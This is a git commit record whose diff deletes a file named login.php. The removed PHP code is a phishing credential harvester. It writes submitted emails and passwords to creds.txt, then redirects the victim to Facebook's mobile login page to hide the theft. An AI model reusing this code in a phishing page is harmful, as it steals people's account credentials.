8bd145dc773ed8b772a39985f8043ba202a37a71
johnsteven1 <chin.hwa765@gmail.com>
2025-05-06 23:59:45 +0100

    Delete login.php

--- login.php
+++
@@ -1,5 +0,0 @@
-<?php
-file_put_contents("creds.txt", "Email: " . $_POST['email'] . " | Password: " . $_POST['password'] . "\n", FILE_APPEND);
-header("Location: https://m.facebook.com/login/");
-exit();
-?>
